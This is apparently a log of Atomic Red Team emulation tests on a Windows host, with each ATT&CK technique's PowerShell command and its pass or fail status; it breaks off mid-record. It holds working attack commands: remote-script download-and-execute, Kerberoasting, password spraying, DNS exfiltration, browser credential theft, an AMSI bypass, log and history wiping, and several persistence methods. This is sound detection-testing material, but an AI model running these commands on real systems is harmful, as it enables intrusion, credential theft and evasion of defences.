------------------------------
{'ability_id': '5e3512c73a461c17ddcb1cc0bbdbeef9',
 'agent_reported_time': '2023-11-11T13:10:32Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.003',
            'technique_name': 'Steal or Forge Kerberos Tickets: Kerberoasting'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); "
            'Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"',
 'delegated': '2023-12-03T06:01:57Z',
 'description': 'PowerSharpPack - Kerberoasting Using Rubeus technique via '
                'function of WinPwn',
 'executor': 'psh',
 'link_id': 'c2f66087-1393-47e8-b6e5-323287be3156',
 'name': 'WinPwn - PowerSharpPack - Kerberoasting Using Rubeus',
 'pid': 10992,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); "
                      'Invoke-Rubeus -Command "kerberoast /format:hashcat '
                      '/nowrap"',
 'platform': 'windows',
 'run': '2023-12-03T06:02:48Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__50df8303a555242bea67342db40d0d47__trial_1

atomic_ordering: ['50df8303a555242bea67342db40d0d47']
------------------------------
{'ability_id': '50df8303a555242bea67342db40d0d47',
 'agent_reported_time': '2023-11-11T13:10:34Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': 'reg.exe add "HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" '
            '/v ART /t REG_SZ /d '
            '"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" '
            '/f; iex '
            '([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp '
            "'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))",
 'delegated': '2023-11-28T06:21:32Z',
 'description': 'Execution of a PowerShell payload from the Windows Registry '
                'similar to that seen in fileless malware infections. Upon '
                'exection, open "C:\\Windows\\Temp" and verify that\n'
                'art-marker.txt is in the folder.\n',
 'executor': 'psh',
 'link_id': 'f11372cd-31f5-4e9b-93d9-e8691d272421',
 'name': 'PowerShell Fileless Script Execution',
 'pid': 4532,
 'plaintext_command': 'reg.exe add '
                      '"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" '
                      '/v ART /t REG_SZ /d '
                      '"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" '
                      '/f; iex '
                      '([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp '
                      "'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))",
 'platform': 'windows',
 'run': '2023-11-28T06:22:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__4df4fdb269f34dd6d55969c83ff06c73__trial_1

atomic_ordering: ['4df4fdb269f34dd6d55969c83ff06c73']
------------------------------
{'ability_id': '4df4fdb269f34dd6d55969c83ff06c73',
 'agent_reported_time': '2023-11-11T13:09:53Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.003',
            'technique_name': 'Event Triggered Execution: Windows Management '
                              'Instrumentation Event Subscription'},
 'command': '$FilterArgs = '
            "@{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 "
            "EventNameSpace='root\\CimV2';                 "
            'QueryLanguage="WQL";                 Query="SELECT * FROM '
            '__InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA '
            "'Win32_PerfFormattedData_PerfOS_System' AND "
            'TargetInstance.SystemUpTime >= 240 AND '
            'TargetInstance.SystemUpTime < 325"}; $Filter=Set-WmiInstance '
            '-Class __EventFilter -Namespace "root\\subscription" -Arguments '
            '$FilterArgs; $ConsumerArgs = '
            "@{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 "
            "ScriptingEngine='VBScript';                 "
            "ScriptText=';                 Set objws = "
            'CreateObject("Wscript.Shell");                 objws.Run '
            '"notepad.exe", 0, True;                 \'}; '
            '$Consumer=Set-WmiInstance -Namespace "root\\subscription" -Class '
            'ActiveScriptEventConsumer -Arguments $ConsumerArgs; '
            '$FilterToConsumerArgs = @{; Filter = $Filter; Consumer = '
            '$Consumer; }; $FilterToConsumerBinding = Set-WmiInstance '
            "-Namespace 'root/subscription' -Class '__FilterToConsumerBinding' "
            '-Arguments $FilterToConsumerArgs',
 'delegated': '2023-12-01T18:48:45Z',
 'description': 'Run from an administrator powershell window. After running, '
                'reboot the victim machine.\n'
                'After it has been online for 4 minutes you should see '
                'notepad.exe running as SYSTEM.\n'
                '\n'
                'Code references\n'
                '\n'
                'https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n',
 'executor': 'psh',
 'link_id': '9cdb5edc-4380-4a07-96ca-efd8997f245b',
 'name': 'Persistence via WMI Event Subscription - ActiveScriptEventConsumer',
 'pid': 5244,
 'plaintext_command': '$FilterArgs = '
                      "@{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 "
                      "EventNameSpace='root\\CimV2';                 "
                      'QueryLanguage="WQL";                 Query="SELECT * '
                      'FROM __InstanceModificationEvent WITHIN 60 WHERE '
                      'TargetInstance ISA '
                      "'Win32_PerfFormattedData_PerfOS_System' AND "
                      'TargetInstance.SystemUpTime >= 240 AND '
                      'TargetInstance.SystemUpTime < 325"}; '
                      '$Filter=Set-WmiInstance -Class __EventFilter -Namespace '
                      '"root\\subscription" -Arguments $FilterArgs; '
                      '$ConsumerArgs = '
                      "@{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 "
                      "ScriptingEngine='VBScript';                 "
                      "ScriptText=';                 Set objws = "
                      'CreateObject("Wscript.Shell");                 '
                      'objws.Run "notepad.exe", 0, True;                 \'}; '
                      '$Consumer=Set-WmiInstance -Namespace '
                      '"root\\subscription" -Class ActiveScriptEventConsumer '
                      '-Arguments $ConsumerArgs; $FilterToConsumerArgs = @{; '
                      'Filter = $Filter; Consumer = $Consumer; }; '
                      '$FilterToConsumerBinding = Set-WmiInstance -Namespace '
                      "'root/subscription' -Class '__FilterToConsumerBinding' "
                      '-Arguments $FilterToConsumerArgs',
 'platform': 'windows',
 'run': '2023-12-01T18:48:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1048__exfiltration__exfiltration_over_alternative_protocol__35b68f98acbdbdde166d4154462d2467__trial_1

atomic_ordering: ['35b68f98acbdbdde166d4154462d2467']
------------------------------
{'ability_id': '35b68f98acbdbdde166d4154462d2467',
 'agent_reported_time': '2023-11-11T13:09:51Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1048',
            'technique_name': 'Exfiltration Over Alternative Protocol'},
 'command': 'Import-Module '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1"; '
            'Invoke-DNSExfiltrator -i '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1" -d '
            'target.example.com -p atomic -doh google -t 500 None',
 'delegated': '2023-11-27T21:37:51Z',
 'description': 'DNSExfiltrator allows for transferring (exfiltrate) a file '
                'over a DNS request covert channel. This is basically a data '
                'leak testing tool allowing to exfiltrate data over a covert '
                'channel.\n'
                '!!! Test will fail without a domain under your control with A '
                'record and NS record !!! \n'
                'See this github page for more details - '
                'https://github.com/Arno0x/DNSExfiltrator\n',
 'executor': 'psh',
 'link_id': '5ba46a11-bd85-403e-8f80-634a3cc4fc33',
 'name': 'DNSExfiltration (doh)',
 'pid': 712,
 'plaintext_command': 'Import-Module '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1"; '
                      'Invoke-DNSExfiltrator -i '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1" '
                      '-d target.example.com -p atomic -doh google -t 500 None',
 'platform': 'windows',
 'run': '2023-11-27T21:38:02Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__adce11c81bb77ae74660c6c743a0442d__trial_1

atomic_ordering: ['adce11c81bb77ae74660c6c743a0442d']
------------------------------
{'ability_id': 'adce11c81bb77ae74660c6c743a0442d',
 'agent_reported_time': '2023-11-11T13:09:45Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.003',
            'technique_name': 'Indicator Removal on Host: Clear Command '
                              'History'},
 'command': 'Remove-Item (Get-PSReadlineOption).HistorySavePath',
 'delegated': '2023-11-28T16:38:54Z',
 'description': 'Clears Powershell history\n',
 'executor': 'psh',
 'link_id': '46e5d69d-d60f-48b1-996b-06a42a0309ae',
 'name': 'Clear Powershell History by Deleting History File',
 'pid': 9640,
 'plaintext_command': 'Remove-Item (Get-PSReadlineOption).HistorySavePath',
 'platform': 'windows',
 'run': '2023-11-28T16:39:08Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1574_011__multiple__hijack_execution_flow-_services_registry_permissions_weakness__6d3a92f7fc3d8abeea37531cfba7c79e__trial_1

atomic_ordering: ['6d3a92f7fc3d8abeea37531cfba7c79e']
------------------------------
{'ability_id': '6d3a92f7fc3d8abeea37531cfba7c79e',
 'agent_reported_time': '2023-11-11T13:09:46Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1574.011',
            'technique_name': 'Hijack Execution Flow: Services Registry '
                              'Permissions Weakness'},
 'command': 'get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* '
            '|FL; get-acl '
            'REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename '
            '|FL',
 'delegated': '2023-12-04T01:41:14Z',
 'description': 'Service registry permissions weakness check and then which '
                'can lead to privilege escalation with ImagePath. eg.\n'
                'reg add '
                '"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}" '
                '/f /v ImagePath /d "C:\\temp\\AtomicRedteam.exe"\n',
 'executor': 'psh',
 'link_id': '1b2dd9a3-9632-4d28-a28d-1f610b816897',
 'name': 'Service Registry Permissions Weakness',
 'pid': 8720,
 'plaintext_command': 'get-acl '
                      'REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* '
                      '|FL; get-acl '
                      'REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename '
                      '|FL',
 'platform': 'windows',
 'run': '2023-12-04T01:42:50Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_003__defense-evasion__indicator_removal_on_host-_clear_command_history__18d69a8fd988d6b63f5307ce857723c9__trial_1

atomic_ordering: ['18d69a8fd988d6b63f5307ce857723c9']
------------------------------
{'ability_id': '18d69a8fd988d6b63f5307ce857723c9',
 'agent_reported_time': '2023-11-11T13:10:37Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.003',
            'technique_name': 'Indicator Removal on Host: Clear Command '
                              'History'},
 'command': 'Set-PSReadLineOption -AddToHistoryHandler { return $false }',
 'delegated': '2023-11-28T16:19:37Z',
 'description': 'The "AddToHistoryHandler" receives the current command as the '
                '$line variable and then returns $true if \n'
                'the line should be written to the history file. Here we '
                'simply return $false so nothing gets added to \n'
                'the history file for the current session. \n',
 'executor': 'psh',
 'link_id': '5f853450-6f64-4aaa-8dbe-3f39c5c2bbcd',
 'name': 'Set Custom AddToHistoryHandler to Avoid History File Logging',
 'pid': 5416,
 'plaintext_command': 'Set-PSReadLineOption -AddToHistoryHandler { return '
                      '$false }',
 'platform': 'windows',
 'run': '2023-11-28T16:20:28Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__560688901ad2b8f465e98c52379ae834__trial_1

atomic_ordering: ['560688901ad2b8f465e98c52379ae834']
------------------------------
{'ability_id': '560688901ad2b8f465e98c52379ae834',
 'agent_reported_time': '2023-11-11T13:09:01Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': 'Copy-Item "$env:localappdata\\Google\\Chrome\\User '
            'Data\\Default\\Login Data" -Destination '
            '"PathToAtomicsFolder\\..\\ExternalPayloads" > $null; Remove-Item '
            '"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login '
            'Data" > $null; Copy-Item '
            '"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data" '
            '-Destination "$env:localappdata\\Google\\Chrome\\User '
            'Data\\Default\\" > $null; cd '
            '"$env:PathToAtomicsFolder\\T1555.003\\bin"; '
            '.\\BrowserCollector.exe',
 'delegated': '2023-12-02T21:54:28Z',
 'description': '[Github '
                'Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple '
                'password/cookies stealer for chrome, edge, and gecko based '
                'browsers (30 listed working). This attack simulates stealing '
                'the data from the browser files and printing them to the '
                'command line.\n'
                'If using to test with Firefox, if the browser is x64 you need '
                'to use the x64 build\n',
 'executor': 'psh',
 'link_id': '9ba939f6-0f4a-4f68-93d8-d5cd579acec9',
 'name': 'BrowserStealer (Chrome / Firefox / Microsoft Edge)',
 'pid': 10928,
 'plaintext_command': 'Copy-Item "$env:localappdata\\Google\\Chrome\\User '
                      'Data\\Default\\Login Data" -Destination '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads" > $null; '
                      'Remove-Item "$env:localappdata\\Google\\Chrome\\User '
                      'Data\\Default\\Login Data" > $null; Copy-Item '
                      '"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data" '
                      '-Destination "$env:localappdata\\Google\\Chrome\\User '
                      'Data\\Default\\" > $null; cd '
                      '"$env:PathToAtomicsFolder\\T1555.003\\bin"; '
                      '.\\BrowserCollector.exe',
 'platform': 'windows',
 'run': '2023-12-02T21:55:08Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__d6df415c9fbfc30ac359542d67537953__trial_1

atomic_ordering: ['d6df415c9fbfc30ac359542d67537953']
------------------------------
{'ability_id': 'd6df415c9fbfc30ac359542d67537953',
 'agent_reported_time': '2023-11-11T13:09:23Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1048.003',
            'technique_name': 'Exfiltration Over Alternative Protocol: '
                              'Exfiltration Over Unencrypted/Obfuscated Non-C2 '
                              'Protocol'},
 'command': 'Send-MailMessage -From',
 'delegated': '2023-11-27T21:18:20Z',
 'description': 'Exfiltration of specified file over SMTP.\n'
                'Upon successful execution, powershell will send an email with '
                'attached file to exfiltrate to a remote address. Results will '
                'be via stdout.\n',
 'executor': 'psh',
 'link_id': 'ae78f508-a610-4777-8455-f626add55f95',
 'name': 'Exfiltration Over Alternative Protocol - SMTP',
 'pid': 4992,
 'plaintext_command': 'Send-MailMessage -From',
 'platform': 'windows',
 'run': '2023-11-27T21:18:29Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_011__multiple__event_triggered_execution-_application_shimming__a967003ff25bdd94030cdd885feb25d7__trial_1

atomic_ordering: ['a967003ff25bdd94030cdd885feb25d7']
------------------------------
{'ability_id': 'a967003ff25bdd94030cdd885feb25d7',
 'agent_reported_time': '2023-11-11T13:09:40Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.011',
            'technique_name': 'Event Triggered Execution: Application '
                              'Shimming'},
 'command': 'Copy-Item '
            '"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb" '
            'C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; '
            'Copy-Item '
            '"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb" '
            'C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb',
 'delegated': '2023-12-01T20:05:29Z',
 'description': 'Upon execution, check the "C:\\Windows\\apppatch\\Custom\\" '
                'folder for the new shim database\n'
                '\n'
                'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n',
 'executor': 'psh',
 'link_id': 'c4e37841-67eb-4f47-a416-bb2647c8a5d2',
 'name': 'New shim database files created in the default shim database '
         'directory',
 'pid': 2532,
 'plaintext_command': 'Copy-Item '
                      '"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb" '
                      'C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; '
                      'Copy-Item '
                      '"$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb" '
                      'C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb',
 'platform': 'windows',
 'run': '2023-12-01T20:05:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1110_003__credential-access__brute_force-_password_spraying__c285cfeaf0c226d3d2b3812726dbe3a8__trial_1

atomic_ordering: ['c285cfeaf0c226d3d2b3812726dbe3a8']
------------------------------
{'ability_id': 'c285cfeaf0c226d3d2b3812726dbe3a8',
 'agent_reported_time': '2023-11-11T13:10:07Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1110.003',
            'technique_name': 'Brute Force: Password Spraying'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' "
            '-UseBasicParsing); Invoke-DomainPasswordSpray -Password '
            'Spring2017 -Domain $Env:USERDOMAIN -Force',
 'delegated': '2023-11-29T22:17:28Z',
 'description': 'Perform a domain password spray using the DomainPasswordSpray '
                'tool. It will try a single password against all users in the '
                'domain\n'
                '\n'
                'https://github.com/dafthack/DomainPasswordSpray\n',
 'executor': 'psh',
 'link_id': '41018c9b-bcdf-4194-955a-502de4f6edfd',
 'name': 'Password Spray (DomainPasswordSpray)',
 'pid': 6896,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' "
                      '-UseBasicParsing); Invoke-DomainPasswordSpray -Password '
                      'Spring2017 -Domain $Env:USERDOMAIN -Force',
 'platform': 'windows',
 'run': '2023-11-29T22:17:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1620__defense-evasion__reflective_code_loading__aa758d17faffeeb69c56481340891859__trial_1

atomic_ordering: ['aa758d17faffeeb69c56481340891859']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1564_004__defense-evasion__hide_artifacts-_ntfs_file_attributes__8da7c7a6e9a5b3bf95107b38230b09f6__trial_1

atomic_ordering: ['8da7c7a6e9a5b3bf95107b38230b09f6']
==============================
==============================
adversary_id: atomic__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__358926f4adef63bf95d152e35df4dab3__trial_1

atomic_ordering: ['358926f4adef63bf95d152e35df4dab3']
------------------------------
{'ability_id': '358926f4adef63bf95d152e35df4dab3',
 'agent_reported_time': '2023-11-11T13:08:34Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.004',
            'technique_name': 'Steal or Forge Kerberos Tickets: AS-REP '
                              'Roasting'},
 'command': 'cmd.exe /c '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" '
            'asreproast '
            '/outfile:"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt"',
 'delegated': '2023-12-03T07:36:46Z',
 'description': "Information on the Rubeus tool and it's creators found here: "
                'https://github.com/GhostPack/Rubeus#asreproast\n'
                'This build targets .NET 4.5.  If targeting a different '
                'version you will need to compile Rubeus\n',
 'executor': 'psh',
 'link_id': 'b2e29c6a-eebd-4131-ae23-438a42351b84',
 'name': 'Rubeus asreproast',
 'pid': 348,
 'plaintext_command': 'cmd.exe /c '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" '
                      'asreproast '
                      '/outfile:"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt"',
 'platform': 'windows',
 'run': '2023-12-03T07:37:03Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__34952e2eefd3066c5f574744e1734ca6__trial_1

atomic_ordering: ['34952e2eefd3066c5f574744e1734ca6']
------------------------------
{'ability_id': '34952e2eefd3066c5f574744e1734ca6',
 'agent_reported_time': '2023-11-11T13:09:54Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
 'delegated': '2023-12-03T09:51:47Z',
 'description': 'Any easy way to bypass AMSI inspection is it patch the dll in '
                'memory setting the "amsiInitFailed" function to true.\n'
                'Upon execution, no output is displayed.\n'
                '\n'
                'https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n',
 'executor': 'psh',
 'link_id': '0b356739-a454-45fb-b4e7-8c75bc42bda1',
 'name': 'AMSI Bypass - AMSI InitFailed',
 'pid': 8644,
 'plaintext_command': "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
 'platform': 'windows',
 'run': '2023-12-03T09:51:56Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1124__discovery__system_time_discovery__6913e132cdd2d9c29294490c2fbef2eb__trial_1

atomic_ordering: ['6913e132cdd2d9c29294490c2fbef2eb']
------------------------------
{'ability_id': '6913e132cdd2d9c29294490c2fbef2eb',
 'agent_reported_time': '2023-11-11T13:09:51Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1124',
            'technique_name': 'System Time Discovery'},
 'command': 'Get-Date',
 'delegated': '2023-11-30T05:03:29Z',
 'description': 'Identify the system time via PowerShell. Upon execution, the '
                'system time will be displayed.\n',
 'executor': 'psh',
 'link_id': '1d7d40d0-0382-409a-841e-d19245c2bc37',
 'name': 'System Time Discovery - PowerShell',
 'pid': 1576,
 'plaintext_command': 'Get-Date',
 'platform': 'windows',
 'run': '2023-11-30T05:03:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__2413b013bc82d152765e2ac34601a327__trial_1

atomic_ordering: ['2413b013bc82d152765e2ac34601a327']
------------------------------
{'ability_id': '2413b013bc82d152765e2ac34601a327',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1070.004',
            'technique_name': 'Indicator Removal on Host: File Deletion'},
 'command': 'Remove-Item -Path (Join-Path "$Env:SystemRoot\\prefetch\\" '
            '(Get-ChildItem -Path "$Env:SystemRoot\\prefetch\\*.pf" -Name)[0])',
 'delegated': '2023-11-28T17:37:13Z',
 'description': 'Delete a single prefetch file.  Deletion of prefetch files is '
                'a known anti-forensic technique. To verify execution, Run '
                '"(Get-ChildItem -Path "$Env:SystemRoot\\prefetch\\*.pf" | '
                'Measure-Object).Count"\n'
                'before and after the test to verify that the number of '
                'prefetch files decreases by 1.\n',
 'executor': 'psh',
 'link_id': '4f3c71d6-aeab-4a5d-a1eb-b92a2f9bbeae',
 'name': 'Delete Prefetch File',
 'pid': 8708,
 'plaintext_command': 'Remove-Item -Path (Join-Path '
                      '"$Env:SystemRoot\\prefetch\\" (Get-ChildItem -Path '
                      '"$Env:SystemRoot\\prefetch\\*.pf" -Name)[0])',
 'platform': 'windows',
 'run': '2023-11-28T17:37:31Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1546_008__multiple__event_triggered_execution-_accessibility_features__4bdc05fe2f0006f86575053dc740edf3__trial_1

atomic_ordering: ['4bdc05fe2f0006f86575053dc740edf3']
------------------------------
{'ability_id': '4bdc05fe2f0006f86575053dc740edf3',
 'agent_reported_time': '2023-11-11T13:09:05Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.008',
            'technique_name': 'Event Triggered Execution: Accessibility '
                              'Features'},
 'command': '$input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, '
            'narrator.exe, DisplaySwitch.exe, atbroker.exe".split(","); $Name '
            '= "Debugger"; $Value = "C:\\windows\\system32\\cmd.exe"; Foreach '
            '($item in $input_table){;   $item = $item.trim();   $registryPath '
            '= "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image '
            'File Execution Options\\$item";   IF(!(Test-Path '
            '$registryPath));   {;     New-Item -Path $registryPath '
            '-Force;     New-ItemProperty -Path $registryPath -Name $name '
            '-Value $Value -PropertyType STRING -Force;   };   ELSE;   {;     '
            'New-ItemProperty -Path $registryPath -Name $name -Value $Value;   '
            '}; }',
 'delegated': '2023-12-01T19:26:41Z',
 'description': 'Attaches cmd.exe to a list of processes. Configure your own '
                'Input arguments to a different executable or list of '
                'executables.\n'
                'Upon successful execution, powershell will modify the '
                'registry and swap osk.exe with cmd.exe.\n',
 'executor': 'psh',
 'link_id': 'c6e331f0-9af0-4148-8e2f-aad48b8bb28e',
 'name': 'Attaches Command Prompt as a Debugger to a List of Target Processes',
 'pid': 8424,
 'plaintext_command': '$input_table = "osk.exe, sethc.exe, utilman.exe, '
                      'magnify.exe, narrator.exe, DisplaySwitch.exe, '
                      'atbroker.exe".split(","); $Name = "Debugger"; $Value = '
                      '"C:\\windows\\system32\\cmd.exe"; Foreach ($item in '
                      '$input_table){;   $item = $item.trim();   $registryPath '
                      '= "HKLM:\\SOFTWARE\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Image File Execution '
                      'Options\\$item";   IF(!(Test-Path $registryPath));   '
                      '{;     New-Item -Path $registryPath -Force;     '
                      'New-ItemProperty -Path $registryPath -Name $name -Value '
                      '$Value -PropertyType STRING -Force;   };   ELSE;   '
                      '{;     New-ItemProperty -Path $registryPath -Name $name '
                      '-Value $Value;   }; }',
 'platform': 'windows',
 'run': '2023-12-01T19:27:12Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_012__multiple__event_triggered_execution-_image_file_execution_options_injection__7f43a2b144f2534eb979d2b6638e0283__trial_1

atomic_ordering: ['7f43a2b144f2534eb979d2b6638e0283']
------------------------------
{'ability_id': '7f43a2b144f2534eb979d2b6638e0283',
 'agent_reported_time': '2023-11-11T13:10:22Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.012',
            'technique_name': 'Event Triggered Execution: Image File Execution '
                              'Options Injection'},
 'command': '$Name = "GlobalFlag"; $Value = "512"; $registryPath = '
            '"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image '
            'File Execution Options\\whoami.exe"; New-Item -Path $registryPath '
            '-Force; New-ItemProperty -Path $registryPath -Name $Name -Value '
            '$Value -PropertyType DWord -Force; $Name = "ReportingMode"; '
            '$Value = "1"; $SilentProcessExit = '
            '"HKLM:\\SOFTWARE\\Microsoft\\Windows '
            'NT\\CurrentVersion\\SilentProcessExit\\whoami.exe"; New-Item '
            '-Path $SilentProcessExit -Force; New-ItemProperty -Path '
            '$SilentProcessExit -Name $Name -Value $Value -PropertyType DWord '
            '-Force ; $Name = "MonitorProcess"; $Value = "cmd.exe /c '
            'calc.exe"; New-ItemProperty -Path $SilentProcessExit -Name $Name '
            '-Value $Value -PropertyType String -Force; Start-Process '
            'whoami.exe',
 'delegated': '2023-12-01T20:44:12Z',
 'description': 'The following Atomic Test will create a GlobalFlag key under '
                'Image File Execution Options, also a SilentProcessExit Key '
                'with ReportingMode and MonitorProcess values. This test is '
                'similar to a recent CanaryToken that will generate an '
                'EventCode 3000 in the Application log when a command, '
                'whoami.exe for example, is executed.\n'
                'Upon running Whoami.exe, a command shell will spawn and start '
                'calc.exe based on the MonitorProcess value. \n'
                'Upon successful execution, powershell will modify the '
                'registry and spawn calc.exe. An event 3000 will generate in '
                'the Application log.\n',
 'executor': 'psh',
 'link_id': '44225354-a19e-47a9-9f83-ab6d553947f5',
 'name': 'GlobalFlags in Image File Execution Options',
 'pid': 6340,
 'plaintext_command': '$Name = "GlobalFlag"; $Value = "512"; $registryPath = '
                      '"HKLM:\\SOFTWARE\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Image File Execution '
                      'Options\\whoami.exe"; New-Item -Path $registryPath '
                      '-Force; New-ItemProperty -Path $registryPath -Name '
                      '$Name -Value $Value -PropertyType DWord -Force; $Name = '
